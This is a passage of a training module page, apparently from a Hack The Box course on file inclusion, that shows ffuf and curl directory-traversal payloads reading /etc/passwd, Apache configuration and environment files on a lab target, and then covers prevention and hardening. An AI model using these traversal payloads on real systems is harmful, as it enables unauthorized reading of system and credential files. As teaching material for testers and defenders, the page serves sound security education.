+..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd  [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd&amp;=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fetc%<span class="hljs-number">2</span>Fpasswd [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/%2e%2e/</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/etc/</span>passwd [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3661</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">645</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">91</span>]
+</code></pre>
+<p>As we can see, the scan yielded a number of LFI payloads that can be used to exploit the vulnerability. Once we have the identified payloads, we should manually test them to verify that they work as expected and show the included file content.</p>
+<hr>
+<h3 id="fuzzing-server-files">Fuzzing Server Files</h3>
+<p>In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: <code>Server webroot path</code>, <code>server configurations file</code>, and <code>server logs</code>.</p>
+<p><strong>Server Webroot</strong></p>
+<p>We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its <code>/uploads</code> directory through relative paths (e.g. <code>../../uploads</code>). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.</p>
+<p>To do so, we can fuzz for the <code>index.php</code> file through common webroot paths, which we can find in this <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">wordlist for Linux</a> or this <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">wordlist for Windows</a>. Depending on our LFI situation, we may need to add a few back directories (e.g. <code>../../../../</code>), and then add our <code>index.php</code> afterwords.</p>
+<p>The following is an example of how we can do all of this with ffuf:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w /</span>opt<span class="hljs-regexp">/useful/</span>SecLists<span class="hljs-regexp">/Discovery/</span>Web-Content<span class="hljs-regexp">/default-web-root-directory-linux.txt:FUZZ -u 'http:/</span><span class="hljs-regexp">/&lt;SERVER_IP&gt;:&lt;PORT&gt;/</span>index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+...SNIP...
+
+: <span class="hljs-string">Method           :</span> GET
+ :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php</span>
+ :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span><span class="hljs-keyword">default</span>-web-root-directory-linux.txt
+ :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
+ :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
+ :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>
+ :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> <span class="hljs-number">2287</span>
+________________________________________________
+
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>          [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">0</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">1</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">1</span>]
+</code></pre>
+<p>As we can see, the scan did indeed identify the correct webroot path at (<code>/var/www/html/</code>). We may also use the same <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a> wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.</p>
+<p><strong>Server Logs/Configurations</strong></p>
+<p>As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).</p>
+<p>To do so, we may also use the <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a> wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">wordlist for Linux</a> or this <a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">wordlist for Windows</a>, though they are not part of <code>seclists</code>, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w ./</span>LFI-WordList-<span class="hljs-string">Linux:</span>FUZZ -u <span class="hljs-string">'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ'</span> -fs <span class="hljs-number">2287</span>
+
+...SNIP...
+
+ :: <span class="hljs-string">Method           :</span> GET
+ :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ</span>
+ :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> ./LFI-WordList-Linux
+ :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
+ :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
+ :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>
+ :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> <span class="hljs-number">2287</span>
+________________________________________________
+
+<span class="hljs-regexp">/etc/</span>hosts              [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2461</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">636</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">72</span>]
+<span class="hljs-regexp">/etc/</span>hostname           [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2300</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">634</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">66</span>]
+<span class="hljs-regexp">/etc/</span>login.defs         [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">12837</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">2271</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">406</span>]
+<span class="hljs-regexp">/etc/</span>fstab              [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2324</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">639</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">66</span>]
+<span class="hljs-regexp">/etc/</span>apache2/apache2.conf [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">9511</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">1575</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">292</span>]
+<span class="hljs-regexp">/etc/</span>issue.net          [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">2306</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">636</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">66</span>]
+...SNIP...
+<span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/mods-enabled/</span>status.conf [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3036</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">715</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">94</span>]
+<span class="hljs-regexp">/etc/</span>apache2<span class="hljs-regexp">/mods-enabled/</span>alias.conf [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">3130</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">748</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">89</span>]
+<span class="hljs-regexp">/etc/</span>apache2/envvars    [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">4069</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">823</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">112</span>]
+<span class="hljs-regexp">/etc/</span>adduser.conf       [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">5315</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">1035</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">153</span>]
+</code></pre>
+<p>As we can see, the scan returned over 60 results, many of which were not identified with the <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a> wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read (<code>/etc/apache2/apache2.conf</code>), as it is a known path for the apache server configuration:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http:<span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/apache2.conf</span>
+
+..<span class="hljs-selector-class">.SNIP</span>...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/<span class="hljs-selector-tag">html</span>
+
+        ErrorLog ${APACHE_LOG_DIR}/error<span class="hljs-selector-class">.log</span>
+        CustomLog ${APACHE_LOG_DIR}/access<span class="hljs-selector-class">.log</span> combined
+..<span class="hljs-selector-class">.SNIP</span>...
+</code></pre>
+<p>As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (<code>APACHE_LOG_DIR</code>), which are found in another file we saw above, which is (<code>/etc/apache2/envvars</code>), and we can read it to find the variable values:</p>
+<p>Automated Scanning</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http:<span class="hljs-comment">//&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/envvars</span>
+
+...SNIP...
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state <span class="hljs-keyword">file</span> location. This might be changed to /<span class="hljs-keyword">run</span> <span class="hljs-keyword">in</span> Wheezy+1
+export APACHE_PID_FILE=/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/apache2<span class="hljs-variable">$SUFFIX</span>/apache2.pid
+export APACHE_RUN_DIR=/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/apache2<span class="hljs-variable">$SUFFIX</span>
+export APACHE_LOCK_DIR=/<span class="hljs-keyword">var</span>/lock/apache2<span class="hljs-variable">$SUFFIX</span>
+# Only /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/apache2 is handled <span class="hljs-keyword">by</span> /etc/logrotate.<span class="hljs-keyword">d</span>/apache2.
+export APACHE_LOG_DIR=/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/apache2<span class="hljs-variable">$SUFFIX</span>
+...SNIP...
+</code></pre>
+<p>As we can see, the (<code>APACHE_LOG_DIR</code>) variable is set to (<code>/var/log/apache2</code>), and the previous configuration told us that the log files are <code>/access.log</code> and <code>/error.log</code>, which have accessed in the previous section.</p>
+<p>Note: Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the <code>PHP filters</code> section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.</p>
+<hr>
+<h3 id="lfi-tools">LFI Tools</h3>
+<p>Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are <a href="https://github.com/D35m0nd142/LFISuite">LFISuite</a>, <a href="https://github.com/OsandaMalith/LFiFreak">LFiFreak</a>, and <a href="https://github.com/mzfr/liffy">liffy</a>. We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.</p>
+<p>Unfortunately, most of these tools are not maintained and rely on the outdated <code>python2</code>, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.</p>
+<h2 id="file-inclusion-prevention">File Inclusion Prevention</h2>
+<p>This module has discussed various ways to detect and exploit file inclusion vulnerabilities, along with different security bypasses and remote code execution techniques we can utilize. With that understanding of how to identify file inclusion vulnerabilities through penetration testing, we should now learn how to patch these vulnerabilities and harden our systems to reduce the chances of their occurrence and reduce the impact if they do.</p>
+<hr>
+<h3 id="file-inclusion-prevention">File Inclusion Prevention</h3>
+<p>The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. Furthermore, in the first section of this module, we discussed different functions that may be utilized to include other files within a page and mentioned the privileges each function has. Whenever any of these functions is used, we should ensure that no user input is directly going into them. Of course, this list of functions is not comprehensive, so we should generally consider any function that can read files.</p>
+<p>In some cases, this may not be feasible, as it may require changing the whole architecture of an existing web application. In such cases, we should utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded, while having a default value for all other inputs. If we are dealing with an existing web application, we can create a whitelist that contains all existing paths used in the front-end, and then utilize this list to match the user input. Such a whitelist can have many shapes, like a database table that matches IDs to files, a <code>case-match</code> script that matches names to files, or even a static json map with names and files that can be matched.</p>
+<p>Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulnerabilities.</p>
+<hr>
+<h3 id="preventing-directory-traversal">Preventing Directory Traversal</h3>
+<p>If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a <code>universal attack chain</code>. As we have discussed throughout the module, directory traversal could potentially allow attackers to do any of the following:</p>
+<ul>
+<li>Read <code>/etc/passwd</code> and potentially find SSH Keys or know valid user names for a password spray attack</li>
+<li>Find other services on the box such as Tomcat and read the <code>tomcat-users.xml</code> file</li>
+<li>Discover valid PHP Session Cookies and perform session hijacking</li>
+<li>Read current web application configuration and source code</li>
+</ul>
+<p>The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has <code>basename()</code>, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it.</p>
+<p>If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, go into your home directory (cd ~) and run the command <code>cat .?/.*/.?/etc/passwd</code>. You'll see Bash allows for the <code>?</code> and <code>*</code> wildcards to be used as a <code>.</code>. Now type <code>php -a</code> to enter the PHP Command Line interpreter and run <code>echo file_get_contents('.?/.*/.?/etc/passwd');</code>. You'll see PHP does not have the same behaviour with the wildcards, if you replace <code>?</code> and <code>*</code> with <code>.</code>, the command will work as expected. This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the <code>system()</code> function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.</p>
+<p>Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">while</span>(substr_count($input, <span class="hljs-string">'../'</span>, <span class="hljs-number">0</span>)) {
+    $input = str_replace(<span class="hljs-string">'../'</span>, <span class="hljs-string">''</span>, $input);
+};
+</code></pre>
+<p>As we can see, this code recursively removes <code>../</code> sub-strings, so even if the resulting string contains <code>../</code> it would still remove it, which would prevent some of the bypasses we attempted in this module.</p>
+<hr>
+<h3 id="web-server-configuration">Web Server Configuration</h3>
+<p>Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting <code>allow_url_fopen</code> and <code>allow_url_include</code> to Off.</p>
+<p>It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within <code>Docker</code>. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding <code>open_basedir = /var/www</code> in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like <a href="https://www.php.net/manual/en/wrappers.expect.php">PHP Expect</a> <a href="https://httpd.apache.org/docs/2.4/mod/mod\_userdir.html">mod_userdir</a>.</p>
+<p>If these configurations are applied, to should prevent accessing files outside the web application folder, so even if an LFI vulnerability is identified, its impact would be reduced.</p>
+<hr>
+<h3 id="web-application-firewall-waf-">Web Application Firewall (WAF)</h3>
+<p>The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as <code>ModSecurity</code>. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a <code>permissive</code> mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.</p>
+<p>Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the <a href="https://content.fireeye.com/m-trends/rpt-m-trends-2020">FireEye M-Trends Report of 2020</a>, the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker.</p>
+<p>It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm whether the exploit was used against the system or not.</p>
+</div></body></html>
